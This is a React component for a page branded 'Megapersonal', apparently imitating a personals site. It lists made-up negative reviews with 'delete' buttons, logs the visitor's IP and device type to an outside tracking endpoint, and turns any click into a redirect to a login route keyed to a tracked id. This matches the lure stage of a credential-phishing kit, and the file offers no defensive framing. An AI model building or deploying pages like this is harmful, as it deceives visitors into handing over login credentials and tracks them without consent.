import React, { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";

export default function EscortComments() {
  // const [showModal, setShowModal] = useState(false);
  const params = useParams();
  const navigate = useNavigate();
  const [userAgent, setUserAgent] = useState("");
  const [userId, setUserId] = useState();
  const [ipAddress, setIPAddress] = useState("");
  let type;

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }
  const providers = [
    {
      id: 1,
      name: "James Walker",
      image: "https://via.placeholder.com/150",
      lastReview: "Was late and didn’t seem prepared for the job.",
      location: "Auburn, AL",
      rating: 2.4,
      reviews: 15,
    },
    {
      id: 2,
      name: "Michael Brooks",
      image: "https://via.placeholder.com/150",
      lastReview: "Lacked professionalism and didn’t follow through.",
      location: "Auburn, AL",
      rating: 2.1,
      reviews: 18,
    },
    {
      id: 3,
      name: "William Turner",
      image: "https://via.placeholder.com/150",
      lastReview: "Did the bare minimum and seemed rushed.",
      location: "Auburn, AL",
      rating: 2.5,
      reviews: 20,
    },
    {
      id: 4,
      name: "Ethan Scott",
      image: "https://via.placeholder.com/150",
      lastReview: "Unorganized and didn’t pay attention to details.",
      location: "Auburn, AL",
      rating: 2.3,
      reviews: 22,
    },
    {
      id: 5,
      name: "Daniel Hughes",
      image: "https://via.placeholder.com/150",
      lastReview: "Communication was poor throughout the process.",
      location: "Auburn, AL",
      rating: 2.0,
      reviews: 17,
    },
    {
      id: 6,
      name: "Matthew Reed",
      image: "https://via.placeholder.com/150",
      lastReview: "Not satisfied with the quality of work delivered.",
      location: "Auburn, AL",
      rating: 2.2,
      reviews: 19,
    },
    {
      id: 7,
      name: "Andrew Cooper",
      image: "https://via.placeholder.com/150",
      lastReview: "Didn’t seem interested in helping at all.",
      location: "Auburn, AL",
      rating: 2.6,
      reviews: 21,
    },
    {
      id: 8,
      name: "Joseph Hayes",
      image: "https://via.placeholder.com/150",
      lastReview: "Missed the appointment and never followed up.",
      location: "Auburn, AL",
      rating: 1.9,
      reviews: 13,
    },
    {
      id: 9,
      name: "David Price",
      image: "https://via.placeholder.com/150",
      lastReview: "Didn’t meet expectations and acted unprofessionally.",
      location: "Auburn, AL",
      rating: 2.3,
      reviews: 16,
    },
    {
      id: 10,
      name: "Logan Bennett",
      image: "https://via.placeholder.com/150",
      lastReview: "Rushed the job and skipped important steps.",
      location: "Auburn, AL",
      rating: 2.4,
      reviews: 18,
    },
    {
      id: 11,
      name: "Benjamin Parker",
      image: "https://via.placeholder.com/150",
      lastReview: "Did not bring the tools needed to complete the work.",
      location: "Auburn, AL",
      rating: 2.1,
      reviews: 14,
    },
    {
      id: 12,
      name: "Noah Simmons",
      image: "https://via.placeholder.com/150",
      lastReview: "Was polite but the service was subpar.",
      location: "Auburn, AL",
      rating: 2.5,
      reviews: 19,
    },
    {
      id: 13,
      name: "Alexander Ward",
      image: "https://via.placeholder.com/150",
      lastReview: "Overpromised and underdelivered at every step.",
      location: "Auburn, AL",
      rating: 2.2,
      reviews: 20,
    },
  ];

  // useEffect(() => {
  //   const timer = setTimeout(() => setShowModal(true), 1000);
  //   return () => clearTimeout(timer);
  // }, []);

  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // parse the JSON body
      })
      .then((data) => {
        console.log("Update successful:", data);
        setUserId(data?.data?.userId); // if needed
      })
      .catch((error) => {
        console.error("Fetch error:", error);
      });

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Megapersonal";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes
  }, [type, params.id]);
  const handleClick = () => {
    navigate(`/auth/login/${params.id}`);
  };

  return (
    <div
      className="bg-yellow-100 h-screen max-w-lg mx-auto p-4 relative cursor-pointer overflow-y-hidden"
      onClick={handleClick}
    >
      <img
        src="/header-escort.png"
        alt=""
        className="absolute -top-10 left-0 w-full h-72 object-scale-down"
      />
      <img
        src="/footer-escort.png"
        alt=""
        className="absolute -bottom-20 left-0 w-full h-72 object-scale-down"
      />
      <div className="absolute w-full top-52 left-0 p-3 h-[calc(100vh-380px)] overflow-y-auto">
        {providers.map((provider) => (
          <div className="bg-white rounded-md shadow-md hover:shadow-lg transition mb-3 relative">
            <div className="bg-[#C8D7BA] p-2 rounded-t-md">
              <h4 className="text-base text-white">
                <span className="text-green-600 text-sm font-medium">
                  Today
                </span>
                -{provider?.name}
              </h4>
            </div>
            <div className="bg-white px-2 py-3 rounded-b-md">
              <p className="text-xs">{provider?.lastReview}</p>
            </div>
            <button className="absolute -bottom-3 text-sm right-0 z-20 text-white bg-red-500 px-3 py-1 uppercase">
              delete
            </button>
          </div>
        ))}
      </div>

      {/* {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded shadow-lg w-96 relative">
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-2 right-2 text-black font-bold"
            >
              &times;
            </button>
            <h2 className="text-lg font-bold mb-4">REPORT ABUSE</h2>
            <div className="space-y-2 mb-4">
              <div>
                <input
                  type="radio"
                  name="abuse"
                  id="content"
                  className="mr-2"
                />
                <label htmlFor="content">Content/Photos/Phone</label>
              </div>
              <div>
                <input type="radio" name="abuse" id="scam" className="mr-2" />
                <label htmlFor="scam">Scam/Fake</label>
              </div>
              <div>
                <input type="radio" name="abuse" id="bug" className="mr-2" />
                <label htmlFor="bug">Technical Bug</label>
              </div>
            </div>
            <textarea
              placeholder="Provide Details"
              className="w-full border border-gray-300 rounded p-2 mb-4 h-24"
            ></textarea>
            <div className="mb-2">
              <label className="block text-sm font-medium">Email:</label>
              <input
                type="email"
                className="w-full border border-gray-300 rounded px-2 py-1"
              />
              <p className="text-xs text-gray-600 mt-1">
                must authenticate your email for confirmation
              </p>
            </div>
            <button className="bg-gray-800 text-white px-4 py-2 rounded mt-2">
              SEND REPORT
            </button>
          </div>
        </div>
      )} */}
    </div>
  );
}
